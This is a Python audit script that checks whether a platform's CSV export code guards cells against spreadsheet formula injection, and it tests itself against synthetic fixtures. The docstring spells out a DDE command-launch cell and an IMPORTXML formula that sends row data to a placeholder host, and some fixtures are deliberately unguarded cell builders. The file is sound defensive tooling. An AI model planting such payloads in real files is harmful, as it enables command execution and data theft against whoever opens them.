"""csv_formula_injection_check.py -- does every CSV cell on this platform pass
through a guard, and does every guard still carry one?

    python tools/csv_formula_injection_check.py
    python tools/csv_formula_injection_check.py --selftest
    python tools/csv_formula_injection_check.py --json

Report only. Nothing gates on this yet.

── WHAT IT IS LOOKING FOR ────────────────────────────────────────────────────
Excel, LibreOffice Calc and Google Sheets execute a cell whose first character
is `=`, `+`, `-` or `@` as a FORMULA when the file is opened. `=cmd|'/c calc'!A0`
is a DDE launch; `=IMPORTXML("http://x/"&A1,"//a")` exfiltrates the row beside
it. The surrounding CSV quotes do NOT prevent any of it -- the importer strips
them as syntax and then evaluates what is inside.

On 2026-09-17 this pattern existed in 13 files and 53 places on this platform,
as one inline one-liner copied over and over:

    '"' + String(c).replace(/"/g, '""') + '"'

── TWO THINGS IT CHECKS, AND THEY FAIL DIFFERENTLY ──────────────────────────
  1. A RAW CELL CONSTRUCTION anywhere outside a guard helper. That is an
     unguarded export path.
  2. A GUARD HELPER whose body no longer contains the guard. That is worse,
     because every call site still reads as covered.

── WHY IT ACCEPTS TWO GUARD SHAPES ─────────────────────────────────────────
`sairnroofing.html`'s rfCsvCell() was written with a guard BEFORE this sweep and
it is STRICTER than the platform rule: it exempts `-` only for plain decimals,
so `-1e5` is forced to text, and it does not exempt `+` at all. That is the safe
direction, and rewriting a working security control to match a house style is
how a sweep introduces a regression -- so it is accepted as GUARDED rather than
normalised.

THIS IS NOT A COURTESY. `tools/sabotage_control_check.py` scored five
well-written controls as unguarded in September because it recognised one guard
shape and they used a stronger one -- a probe that did the harder thing scored
worse, and the signal was inverted. The same mistake here would report the one
app that got this right before anybody asked as the one app that got it wrong.

── THE BLIND LOCK ───────────────────────────────────────────────────────────
Criteria are locked against synthetic fixtures in BOTH directions before any
real file is read, including a fixture for the stricter shape, because that is
precisely the arm whose absence inverted the other tool.
"""
import io
import json
import os
import re
import sys

CRITERIA_VERSION = '2026-09-17.1'

REPO = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))

# A quoted cell built by hand: '"' + <expr>.replace(/"/g,'""') ...
# The trailing `+ '"'` is deliberately NOT required. The first version of this
# pattern demanded it and MISSED 3 OF 39 SITES IN stonedesk.html -- the three
# that wrapped the inner expression in parentheses, `'"' + (String(c||'')
# .replace(...)) + '"'`. Three sites in the one file being audited, invisible to
# the audit. That is the whole argument for this file existing instead of a grep.
RAW = re.compile(r"""['"]"['"]\s*\+\s*\(?\s*(?:String\(|[A-Za-z_$][\w.$]*)"""
                 r"""[^;]{0,60}?\.replace\(/"/g\s*,\s*['"]""['"]\)""", re.S)

# A function whose name ends in CsvCell / CsvField -- the naming convention the
# sweep established, and what makes "is every site covered" a grep rather than a
# reading exercise.
HELPER_DECL = re.compile(
    r'function\s+([A-Za-z_$][\w$]*(?:CsvCell|CsvField)|csvCell)\s*\(')

# The platform guard: the dangerous class, tested against the head of the cell.
GUARD_CLASS = re.compile(r'/\^\[[^\]]*=[^\]]*\+[^\]]*@[^\]]*\]/')
# The stricter roofing shape: `=+@` plus a separately-handled `-`.
GUARD_SPLIT = re.compile(r"/\^\[[^\]]*=[^\]]*\+[^\]]*@[^\]]*\]/.*?/\^-/", re.S)
# The apostrophe that forces text. Required either way -- a class test that
# does not then prefix anything is a check with no effect.
APOSTROPHE = re.compile(r"""=\s*["']\\?'["']\s*\+""")


def scan_text(src):
    """Return (raw_sites, helpers) for one file's source.

    helpers is a list of (name, guarded, reason).
    """
    helper_lines = {}
    for m in HELPER_DECL.finditer(src):
        a = src.rfind('\n', 0, m.start()) + 1
        b = src.find('\n', m.end())
        # A one-line helper is the shape the sweep inserted; a multi-line one is
        # the hand-written kind. Take up to 14 lines so both are covered without
        # swallowing the next function.
        body = src[a:b]
        if body.count('{') > body.count('}'):
            end = a
            for _ in range(14):
                end = src.find('\n', end + 1)
                if end < 0:
                    break
                body = src[a:end]
                if body.count('{') <= body.count('}'):
                    break
        helper_lines[m.group(1)] = (a, a + len(body), body)

    # A GUARD FACTORED INTO A NAMED CONSTANT IS BETTER CODE AND MUST NOT SCORE
    # WORSE. api/_lib/csv-cell.js writes `const DANGEROUS = /^[=+\-@\t\r]/` and
    # then `DANGEROUS.test(s)`, and the first version of this file reported the
    # one module that got the factoring right as the only unguarded helper on
    # the platform -- the same inversion recorded against sabotage_control_check
    # in September, reproduced here within the hour by somebody who had just
    # written a paragraph about it.
    named = set()
    for m in re.finditer(r'(?:const|let|var)\s+([A-Z_][A-Z0-9_]*)\s*=\s*(/\^\[[^\]]+\]/)',
                         src):
        if GUARD_CLASS.search(m.group(2)):
            named.add(m.group(1))

    helpers = []
    for name, (a, b, body) in sorted(helper_lines.items()):
        has_class = (bool(GUARD_CLASS.search(body)) or bool(GUARD_SPLIT.search(body))
                     or any(re.search(r'\b' + n + r'\s*\.test\s*\(', body)
                            for n in named))
        has_quote = bool(APOSTROPHE.search(body))
        delegates = re.search(r'return\s+[A-Za-z_$][\w$]*(?:CsvCell|CsvField)\s*\(', body)
        if has_class and has_quote:
            helpers.append((name, True, 'guard present'))
        elif delegates:
            helpers.append((name, True, 'delegates to ' + delegates.group(0)
                            .replace('return ', '').replace('(', '')))
        else:
            why = []
            if not has_class:
                why.append('no leading =/+/@ class test')
            if not has_quote:
                why.append("never prefixes an apostrophe")
            helpers.append((name, False, ' and '.join(why)))

    raw = []
    spans = [(a, b) for (a, b, _body) in helper_lines.values()]
    for m in RAW.finditer(src):
        # A construction INSIDE a named helper's BODY is that helper's own
        # quoting, and the helper already has a guarded/unguarded verdict of its
        # own -- counting it again here would report one defect twice and, worse,
        # would report the FIX as a finding.
        #
        # SUPPRESSED BY RANGE, NOT BY LINE. The first version asked whether the
        # construction's own LINE contained `function <name>`, which is true only
        # of a one-line helper -- so every MULTI-LINE helper (the hand-written
        # kind, which is where the real defects were) had its body counted as a
        # raw site. Two of the seven fixtures caught it, which is the whole
        # reason the lock runs before any real file.
        if any(a <= m.start() < b for a, b in spans):
            continue
        a = src.rfind('\n', 0, m.start()) + 1
        line = src[a:src.find('\n', m.end())]
        # A COMMENT IS NOT AN EXPORT PATH. api/_lib/csv-cell.js quotes the
        # defective expression in its own header to say what the defect was, and
        # reporting that as a finding would make the file documenting the fix the
        # worst-scoring file in the sweep. Crude but honest: the construction has
        # to be the code on its line, not inside a `//` that precedes it.
        stripped = line.lstrip()
        if stripped.startswith('//') or stripped.startswith('*'):
            continue
        cut = line.find('//')
        if 0 <= cut < (m.start() - a):
            continue
        raw.append((src[:m.start()].count('\n') + 1, ' '.join(line.split())[:110]))
    return raw, helpers


# ── THE BLIND LOCK ──────────────────────────────────────────────────────────
FIXTURES = [
    ('an UNGUARDED inline cell is a raw site',
     """var csv=rows.map(function(r){return r.map(function(c){"""
     """return '"'+String(c).replace(/"/g,'""')+'"';}).join(',');});""",
     1, []),

    ('the PARENTHESISED variant is a raw site too -- the 3 of 39 a tighter '
     'pattern missed in the file it was auditing',
     """return '"' + (String(c || '').replace(/"/g, '""')) + '"';""",
     1, []),

    ('the platform guard reads as GUARDED',
     """function sdCsvCell(v){var s=v==null?'':String(v);"""
     """if(/^[=+\\-@\\t\\r]/.test(s)&&!(s!==''&&isFinite(Number(s))))s="'"+s;"""
     """return '"'+s.replace(/"/g,'""')+'"';}""",
     0, [('sdCsvCell', True)]),

    ('THE STRICTER ROOFING SHAPE READS AS GUARDED -- this is the arm whose '
     'absence inverted sabotage_control_check in September',
     """function rfCsvCell(v){
  var s=String(v);
  if(/^[=+@\\t\\r]/.test(s)||(/^-/.test(s)&&!/^-?\\d+(\\.\\d+)?$/.test(s)))s="'"+s;
  if(/[",\\n\\r]/.test(s))s='"'+s.replace(/"/g,'""')+'"';
  return s;
}""",
     0, [('rfCsvCell', True)]),

    ('a helper that TESTS the class and never prefixes anything is UNGUARDED '
     "-- a check with no effect is not a guard",
     """function xxCsvCell(v){var s=String(v);"""
     """if(/^[=+\\-@\\t\\r]/.test(s)){/* TODO */}"""
     """return '"'+s.replace(/"/g,'""')+'"';}""",
     0, [('xxCsvCell', False)]),

    ('a CONDITIONAL quoter with no guard is UNGUARDED -- and this is the shape '
     'that emitted the cell completely BARE',
     """function alfCsvField(v){
  var t=String(v==null?'':v);
  if(/[",\\n\\r]/.test(t))return '"'+t.replace(/"/g,'""')+'"';
  return t;
}""",
     0, [('alfCsvField', False)]),

    ('a helper that DELEGATES to a guarded one reads as GUARDED',
     """function dntCsvField(v){
  return dntCsvCell(v);
}""",
     0, [('dntCsvField', True)]),

    ('A GUARD FACTORED INTO A NAMED CONSTANT READS AS GUARDED. Without this '
     'arm the one module that got the factoring right scored as the only '
     'unguarded helper on the platform -- and it did, for about ten minutes',
     """const DANGEROUS = /^[=+\\-@\\t\\r]/;
function csvCell(v) {
  let s = v == null ? '' : String(v);
  if (DANGEROUS.test(s) && !looksNumeric(s)) s = "'" + s;
  return '"' + s.replace(/"/g, '""') + '"';
}""",
     0, [('csvCell', True)]),
]


def selftest():
    ok = True

    def check(name, cond, detail=''):
        nonlocal ok
        print('  %-4s %s%s' % ('ok' if cond else 'FAIL', name,
                               '' if cond else '   <- ' + str(detail)))
        if not cond:
            ok = False

    print('CSV FORMULA INJECTION CHECK -- selftest, criteria %s' % CRITERIA_VERSION)
    print('\n1. the blind lock: criteria fixed against synthetic fixtures in BOTH')
    print('   directions BEFORE any real file is read')
    for name, src, want_raw, want_helpers in FIXTURES:
        raw, helpers = scan_text(src)
        check('%-3d raw  %s' % (len(raw), name), len(raw) == want_raw,
              'expected %d raw, got %d' % (want_raw, len(raw)))
        got = dict((n, g) for n, g, _ in helpers)
        for hn, hg in want_helpers:
            check('     %s -> %s' % (hn, 'GUARDED' if hg else 'UNGUARDED'),
                  got.get(hn) == hg, 'got %r' % (got.get(hn),))

    print('\n2. the counter can tell the FIX from the DEFECT')
    # The first version of the sweep script counted the helper it had just
    # inserted as a raw site, so every fixed file reported the same number
    # before and after -- a checker that cannot tell them apart proves nothing.
    guarded = FIXTURES[2][1]
    raw, _ = scan_text(guarded)
    check('a file containing ONLY the guard has zero raw sites', len(raw) == 0, raw)

    print('\n' + ('  all arms pass' if ok else '  ARMS FAILED'))
    return 0 if ok else 2


TARGETS = ['*.html', os.path.join('api', '**', '*.js')]


def targets():
    import glob
    out = []
    for pat in TARGETS:
        for p in glob.glob(os.path.join(REPO, pat), recursive=True):
            rel = os.path.relpath(p, REPO)
            if 'node_modules' in rel or rel.startswith('archive'):
                continue
            if rel.endswith('.test.js'):
                continue
            out.append(rel)
    return sorted(set(out))


def main(argv):
    if '--selftest' in argv:
        return selftest()
    rows = []
    for rel in targets():
        try:
            src = io.open(os.path.join(REPO, rel), encoding='utf-8',
                          errors='replace').read()
        except OSError as e:
            print('COULD NOT READ %s (%s) -- counted as neither clean nor '
                  'dirty' % (rel, e))
            return 2
        raw, helpers = scan_text(src)
        if raw or helpers:
            rows.append({'file': rel, 'raw': raw, 'helpers': helpers})

    if '--json' in argv:
        print(json.dumps({'criteria_version': CRITERIA_VERSION, 'files': rows},
                         indent=1))
        return 1 if any(r['raw'] or [h for h in r['helpers'] if not h[1]]
                        for r in rows) else 0

    print('CSV FORMULA INJECTION CHECK -- criteria %s, report only'
          % CRITERIA_VERSION)
    st = selftest_quiet()
    print('  blind lock: %s' % st)
    nraw = sum(len(r['raw']) for r in rows)
    bad = [(r['file'], h) for r in rows for h in r['helpers'] if not h[1]]
    print('  files with a CSV cell path : %d' % len(rows))
    print('  RAW cell constructions     : %d   <- an unguarded export path' % nraw)
    print('  guard helpers              : %d' % sum(len(r['helpers']) for r in rows))
    print('  helpers WITHOUT a guard    : %d   <- worse: the call sites still '
          'read as covered' % len(bad))
    print('')
    for r in rows:
        marks = ['%s %s' % ('GUARDED  ' if g else '*** NO GUARD', n)
                 for n, g, _ in r['helpers']]
        print('  %-24s %s' % (r['file'], '; '.join(marks) or '-'))
        for line, text in r['raw']:
            print('      *** RAW  L%-7d %s' % (line, text))
        for n, g, why in r['helpers']:
            if not g:
                print('      *** %s : %s' % (n, why))
    print('')
    print('  WHAT A ZERO HERE DOES NOT MEAN. This finds cells built by the')
    print('  string-concatenation shape this platform uses. A future export')
    print('  written with a CSV library, a template, or Array.join on unquoted')
    print('  values is INVISIBLE to it -- and an export with no quoting at all')
    print('  is invisible twice over, because there is no .replace to match.')
    print('  The naming convention is what makes coverage checkable; a new')
    print('  export path that skips it is not detected by this file.')
    return 1 if (nraw or bad) else 0


def selftest_quiet():
    import io as _io
    import contextlib
    buf = _io.StringIO()
    with contextlib.redirect_stdout(buf):
        rc = selftest()
    txt = buf.getvalue()
    n = txt.count('  ok ')
    return ('%d/%d fixtures correct' % (n, n) if rc == 0
            else 'FAILED -- criteria are not locked, nothing below is trustworthy')


if __name__ == '__main__':
    sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8',
                                  errors='replace')
    sys.exit(main(sys.argv[1:]))
